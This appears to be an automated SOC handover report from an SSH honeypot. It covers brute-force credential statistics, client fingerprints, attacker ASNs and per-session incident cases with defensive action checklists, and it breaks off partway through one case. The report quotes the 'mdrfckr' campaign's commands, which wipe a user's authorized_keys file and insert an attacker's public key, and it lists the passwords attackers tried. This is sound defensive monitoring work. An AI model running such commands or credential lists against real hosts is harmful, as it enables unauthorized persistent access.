# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-03 |
| **Generated At** | 2026-09-03T08:45:10Z |
| **Shift Time** | 08:45 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **143** |
| Confirmed Threats | **116** |
| False Positives Filtered | **27** (18.9%) |
| Unique Attacker IPs | **56** |
| Countries of Origin | **24** |
| High Severity Cases | **73** |
| Medium Severity Cases | **1** |
| Low Severity Cases | **69** |
| Malware Samples Analyzed | **4** HIGH · **20** MED · 19 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **79** |
| Unique Credential Pairs | **64** |
| Unique Usernames | **16** |
| Unique Passwords | **61** |
| Successful Auth Pairs | **72** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 33 |
| `user` | 10 |
| `admin` | 7 |
| `support` | 7 |
| `345gs5662d34` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 7 |
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `123@@@` | 3 |
| `Temp2017` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 7 |
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `3245gs5662d34` | 3 |
| `root` | `123@@@` | 3 |
| `admin` | `Temp2017` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `Temp2017` | `217.60.255.130` | 2026-09-03T02:57:43 |
| `root` | `Chat@123` | `217.60.255.130` | 2026-09-03T03:04:49 |
| `user` | `q1w2e3r4` | `217.60.255.130` | 2026-09-03T03:07:22 |
| `root` | `Satyam@123` | `217.60.255.130` | 2026-09-03T03:15:46 |
| `sysadmin` | `sysadmin2025` | `217.60.255.130` | 2026-09-03T03:16:59 |
| `root` | `Tech@12345` | `217.60.255.130` | 2026-09-03T03:26:28 |
| `sol` | `sol2024` | `217.60.255.130` | 2026-09-03T03:26:29 |
| `root` | `sam` | `86.97.240.189` | 2026-09-03T03:26:55 |
| `345gs5662d34` | `345gs5662d34` | `86.97.240.189` | 2026-09-03T03:26:59 |
| `root` | `3245gs5662d34` | `86.97.240.189` | 2026-09-03T03:27:00 |
| `support` | `support` | `176.53.159.196` | 2026-09-03T03:30:59 |
| `postgres` | `admin` | `217.60.255.130` | 2026-09-03T03:36:00 |
| `root` | `azerty` | `217.60.255.130` | 2026-09-03T03:37:13 |
| `admin` | `admin1234!` | `217.60.255.130` | 2026-09-03T03:45:42 |
| `root` | `nimda@123` | `217.60.255.130` | 2026-09-03T03:47:57 |
| `user` | `1q2w#E$R` | `217.60.255.130` | 2026-09-03T03:55:11 |
| `root` | `Outlook@123` | `217.60.255.130` | 2026-09-03T03:58:58 |
| `root` | `Q!w2E#r4` | `36.95.221.140` | 2026-09-03T04:00:19 |
| `345gs5662d34` | `345gs5662d34` | `36.95.221.140` | 2026-09-03T04:00:23 |
| `root` | `3245gs5662d34` | `36.95.221.140` | 2026-09-03T04:00:25 |
| `user` | `film` | `217.60.255.130` | 2026-09-03T04:04:50 |
| `root` | `Mobin1234` | `217.60.255.130` | 2026-09-03T04:09:48 |
| `nginx` | `nginx123!` | `217.60.255.130` | 2026-09-03T04:14:26 |
| `root` | `Nader1234` | `217.60.255.130` | 2026-09-03T04:20:25 |
| `www` | `www2024!` | `217.60.255.130` | 2026-09-03T04:23:56 |
| `root` | `Salam@1234` | `217.60.255.130` | 2026-09-03T04:31:17 |
| `test` | `test123@` | `217.60.255.130` | 2026-09-03T04:33:25 |
| `support` | `support` | `10.0.0.73` | 2026-09-03T04:33:34 |
| `root` | `Imam@123` | `217.60.255.130` | 2026-09-03T04:42:08 |
| `postgres` | `postgres2024` | `217.60.255.130` | 2026-09-03T04:43:08 |
| `user` | `.` | `217.60.255.130` | 2026-09-03T04:52:23 |
| `root` | `Salam123` | `217.60.255.130` | 2026-09-03T04:52:38 |
| `user` | `q@123456` | `217.60.255.130` | 2026-09-03T05:02:00 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `162.216.150.65` | 2026-09-03T05:02:14 |
| `root` | `1qaz@WSXcde3` | `217.60.255.130` | 2026-09-03T05:03:27 |
| `debian` | `123!@#qweQWE` | `217.60.255.130` | 2026-09-03T05:11:30 |
| `root` | `@password` | `217.60.255.130` | 2026-09-03T05:14:02 |
| `user` | `a` | `217.60.255.130` | 2026-09-03T05:21:01 |
| `root` | `Test@12345` | `217.60.255.130` | 2026-09-03T05:24:52 |
| `root` | `ubuntu` | `180.76.147.239` | 2026-09-03T05:26:54 |
| `admin` | `admin@12` | `217.60.255.130` | 2026-09-03T05:30:32 |
| `root` | `pass123` | `217.60.255.130` | 2026-09-03T05:35:47 |
| `user` | `ZAQ!2wsx` | `217.60.255.130` | 2026-09-03T05:40:14 |
| `radio` | `radiopassword` | `216.126.225.6` | 2026-09-03T05:43:53 |
| `345gs5662d34` | `345gs5662d34` | `216.126.225.6` | 2026-09-03T05:43:55 |
| `radio` | `3245gs5662d34` | `216.126.225.6` | 2026-09-03T05:43:56 |
| `root` | `Abcd!234` | `217.60.255.130` | 2026-09-03T05:46:21 |
| `root` | `123@@@` | `168.107.19.29` | 2026-09-03T05:46:42 |
| `root` | `LeitboGi0ro` | `168.107.19.29` | 2026-09-03T05:46:42 |
| `user` | `P@ssw0rd2025` | `217.60.255.130` | 2026-09-03T05:49:29 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `65.49.1.182` | 2026-09-03T05:52:18 |
| `root` | `Moslem2026` | `217.60.255.130` | 2026-09-03T05:57:06 |
| `admin` | `P@ssw0rd123!` | `217.60.255.130` | 2026-09-03T05:59:05 |
| `root` | `Mohamad123` | `217.60.255.130` | 2026-09-03T06:07:57 |
| `user` | `123456!@#$%^` | `217.60.255.130` | 2026-09-03T06:08:40 |
| `bitnami` | `password` | `10.0.0.73` | 2026-09-03T06:10:44 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-03T06:10:49 |
| `bitnami` | `3245gs5662d34` | `10.0.0.73` | 2026-09-03T06:10:51 |
| `admin` | `Admin.1234` | `217.60.255.130` | 2026-09-03T06:18:00 |
| `root` | `Payam@1234` | `217.60.255.130` | 2026-09-03T06:18:29 |
| `root` | `Info@123` | `209.99.190.200` | 2026-09-03T06:20:55 |
| `345gs5662d34` | `345gs5662d34` | `209.99.190.200` | 2026-09-03T06:20:58 |
| `root` | `3245gs5662d34` | `209.99.190.200` | 2026-09-03T06:20:59 |
| `mohit` | `mohit` | `14.103.103.211` | 2026-09-03T06:21:59 |
| `345gs5662d34` | `345gs5662d34` | `14.103.103.211` | 2026-09-03T06:22:12 |
| `mohit` | `3245gs5662d34` | `14.103.103.211` | 2026-09-03T06:22:20 |
| `user` | `asd@123` | `217.60.255.130` | 2026-09-03T06:27:30 |
| `root` | `Yunes123` | `217.60.255.130` | 2026-09-03T06:29:07 |
| `admin` | `1122` | `217.60.255.130` | 2026-09-03T06:37:03 |
| `root` | `Farhad@1234` | `217.60.255.130` | 2026-09-03T06:39:42 |
| `admin` | `pass` | `217.60.255.130` | 2026-09-03T06:46:25 |
| `root` | `Masoud1234` | `217.60.255.130` | 2026-09-03T06:50:33 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **143** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 65 |
| Go SSH scanner | 8 |
| Paramiko (Python) | 6 |
| OpenSSH | 6 |
| Unknown | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `419da4c91ddb...` | Modern SSH client | 47 | 1 |
| `f555226df196...` | Mirai/variant | 13 | 5 |
| `6372ee695756...` | Modern SSH client | 6 | 1 |
| `a984ff804585...` | libssh-based | 5 | 1 |
| `eff4c24daffc...` | Modern SSH client | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `419da4c91ddb...` | libssh | 47 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 13 | 5 | Mirai/variant |
| `6372ee695756...` | Paramiko (Python) | 6 | 1 | Modern SSH client |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 3 | 3 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 3 | 3 | Generic scanner |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `86.97.240.189`, `14.103.103.211`, `36.95.221.140`, `216.126.225.6`, `209.99.190.200`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **56** |
| Unique ASNs | **34** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 12 | HIGH |
| `AS396982` | Google LLC | 6 | LOW |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS20473` | The Constant Company, LLC | 2 | HIGH |
| `AS25369` | Hydra Communications Ltd | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS209334` | Modat B.V. | 2 | HIGH |
| `AS6939` | Hurricane Electric LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (73)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5376a3f8bbe9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 02:57 |
| **Last Seen** | 2026-09-03 02:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 02:57:42` | `cowrie.session.connect` |
| `2026-09-03 02:57:42` | `cowrie.client.version` |
| `2026-09-03 02:57:42` | `cowrie.client.kex` |
| `2026-09-03 02:57:43` | `cowrie.login.success` |
| `2026-09-03 02:57:43` | `cowrie.direct-tcpip.request` |
| `2026-09-03 02:57:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 02:57:44` | `cowrie.direct-tcpip.data` |
| `2026-09-03 02:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ead27c15b2f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 03:04 |
| **Last Seen** | 2026-09-03 03:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 03:04:48` | `cowrie.session.connect` |
| `2026-09-03 03:04:48` | `cowrie.client.version` |
| `2026-09-03 03:04:48` | `cowrie.client.kex` |
| `2026-09-03 03:04:49` | `cowrie.login.success` |
| `2026-09-03 03:04:49` | `cowrie.direct-tcpip.request` |
| `2026-09-03 03:04:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 03:04:49` | `cowrie.direct-tcpip.data` |
| `2026-09-03 03:04:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31df47d36367

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 03:07 |
| **Last Seen** | 2026-09-03 03:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 03:07:21` | `cowrie.session.connect` |
| `2026-09-03 03:07:21` | `cowrie.client.version` |
| `2026-09-03 03:07:21` | `cowrie.client.kex` |
| `2026-09-03 03:07:22` | `cowrie.login.success` |
| `2026-09-03 03:07:22` | `cowrie.direct-tcpip.request` |
| `2026-09-03 03:07:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 03:07:23` | `cowrie.direct-tcpip.data` |
| `2026-09-03 03:07:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bbcf6cc320f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 03:15 |
| **Last Seen** | 2026-09-03 03:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 03:15:45` | `cowrie.session.connect` |
| `2026-09-03 03:15:45` | `cowrie.client.version` |
| `2026-09-03 03:15:45` | `cowrie.client.kex` |
| `2026-09-03 03:15:46` | `cowrie.login.success` |
| `2026-09-03 03:15:46` | `cowrie.direct-tcpip.request` |
| `2026-09-03 03:15:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 03:15:47` | `cowrie.direct-tcpip.data` |
| `2026-09-03 03:15:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c579d037cf10

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 03:16 |
| **Last Seen** | 2026-09-03 03:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 03:16:58` | `cowrie.session.connect` |
| `2026-09-03 03:16:58` | `cowrie.client.version` |
| `2026-09-03 03:16:58` | `cowrie.client.kex` |
| `2026-09-03 03:16:59` | `cowrie.login.success` |
| `2026-09-03 03:16:59` | `cowrie.direct-tcpip.request` |
| `2026-09-03 03:16:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 03:16:59` | `cowrie.direct-tcpip.data` |
| `2026-09-03 03:16:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c0fb1bb9ce9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 03:26 |
| **Last Seen** | 2026-09-03 03:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 03:26:27` | `cowrie.session.connect` |
| `2026-09-03 03:26:27` | `cowrie.client.version` |
| `2026-09-03 03:26:27` | `cowrie.client.kex` |
| `2026-09-03 03:26:28` | `cowrie.login.success` |
| `2026-09-03 03:26:28` | `cowrie.direct-tcpip.request` |
| `2026-09-03 03:26:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 03:26:28` | `cowrie.direct-tcpip.data` |
| `2026-09-03 03:26:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-031f669303c4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 03:26 |
| **Last Seen** | 2026-09-03 03:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 03:26:28` | `cowrie.session.connect` |
| `2026-09-03 03:26:28` | `cowrie.client.version` |
| `2026-09-03 03:26:29` | `cowrie.client.kex` |
| `2026-09-03 03:26:29` | `cowrie.login.success` |
| `2026-09-03 03:26:30` | `cowrie.direct-tcpip.request` |
| `2026-09-03 03:26:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 03:26:30` | `cowrie.direct-tcpip.data` |
| `2026-09-03 03:26:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faac696f89ed

| Field | Detail |
|---|---|
| **Source IP** | `86.97.240[.]189` |
| **First Seen** | 2026-09-03 03:26 |
| **Last Seen** | 2026-09-03 03:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 03:26:54` | `cowrie.session.connect` |
| `2026-09-03 03:26:54` | `cowrie.client.version` |
| `2026-09-03 03:26:54` | `cowrie.client.kex` |
| `2026-09-03 03:26:55` | `cowrie.login.success` |
| `2026-09-03 03:26:56` | `cowrie.session.params` |
| `2026-09-03 03:26:56` | `cowrie.command.input` |
| `2026-09-03 03:26:56` | `cowrie.command.failed` |
| `2026-09-03 03:26:56` | `cowrie.log.closed` |
| `2026-09-03 03:26:57` | `cowrie.session.params` |
| `2026-09-03 03:26:57` | `cowrie.command.input` |
| `2026-09-03 03:26:57` | `cowrie.session.file_download` |
| `2026-09-03 03:26:57` | `cowrie.log.closed` |
| `2026-09-03 03:27:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.97.240[.]189` to AbuseIPDB if not already reported
- [ ] Block `86.97.240[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d516c03ed699

| Field | Detail |
|---|---|
| **Source IP** | `86.97.240[.]189` |
| **First Seen** | 2026-09-03 03:26 |
| **Last Seen** | 2026-09-03 03:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 03:26:58` | `cowrie.session.connect` |
| `2026-09-03 03:26:58` | `cowrie.client.version` |
| `2026-09-03 03:26:58` | `cowrie.client.kex` |
| `2026-09-03 03:26:59` | `cowrie.login.success` |
| `2026-09-03 03:26:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.97.240[.]189` to AbuseIPDB if not already reported
- [ ] Block `86.97.240[.]189` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a692b2e7fb5e

| Field | Detail |
|---|---|
| **Source IP** | `86.97.240[.]189` |
| **First Seen** | 2026-09-03 03:26 |
| **Last Seen** | 2026-09-03 03:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 03:26:59` | `cowrie.session.connect` |
| `2026-09-03 03:26:59` | `cowrie.client.version` |
| `2026-09-03 03:26:59` | `cowrie.client.kex` |
| `2026-09-03 03:27:00` | `cowrie.login.success` |
| `2026-09-03 03:27:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.97.240[.]189` to AbuseIPDB if not already reported
- [ ] Block `86.97.240[.]189` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73f2a0e632cc

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-03 03:30 |
| **Last Seen** | 2026-09-03 03:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 03:30:58` | `cowrie.session.connect` |
| `2026-09-03 03:30:58` | `cowrie.client.version` |
| `2026-09-03 03:30:58` | `cowrie.client.kex` |
| `2026-09-03 03:30:59` | `cowrie.login.success` |
| `2026-09-03 03:30:59` | `cowrie.direct-tcpip.request` |
| `2026-09-03 03:30:59` | `cowrie.direct-tcpip.data` |
| `2026-09-03 03:30:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-300e64636994

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 03:35 |
| **Last Seen** | 2026-09-03 03:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 03:35:59` | `cowrie.session.connect` |
| `2026-09-03 03:35:59` | `cowrie.client.version` |
| `2026-09-03 03:35:59` | `cowrie.client.kex` |
| `2026-09-03 03:36:00` | `cowrie.login.success` |
| `2026-09-03 03:36:00` | `cowrie.direct-tcpip.request` |
| `2026-09-03 03:36:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 03:36:00` | `cowrie.direct-tcpip.data` |
| `2026-09-03 03:36:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37a4b3d3c2c6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 03:37 |
| **Last Seen** | 2026-09-03 03:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 03:37:12` | `cowrie.session.connect` |
| `2026-09-03 03:37:12` | `cowrie.client.version` |
| `2026-09-03 03:37:13` | `cowrie.client.kex` |
| `2026-09-03 03:37:13` | `cowrie.login.success` |
| `2026-09-03 03:37:14` | `cowrie.direct-tcpip.request` |
| `2026-09-03 03:37:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 03:37:14` | `cowrie.direct-tcpip.data` |
| `2026-09-03 03:37:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcfd1de01470

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 03:45 |
| **Last Seen** | 2026-09-03 03:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 03:45:40` | `cowrie.session.connect` |
| `2026-09-03 03:45:40` | `cowrie.client.version` |
| `2026-09-03 03:45:41` | `cowrie.client.kex` |
| `2026-09-03 03:45:42` | `cowrie.login.success` |
| `2026-09-03 03:45:42` | `cowrie.direct-tcpip.request` |
| `2026-09-03 03:45:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 03:45:42` | `cowrie.direct-tcpip.data` |
| `2026-09-03 03:45:42` | `cowrie.session.closed` |

**Recommended Actions:**
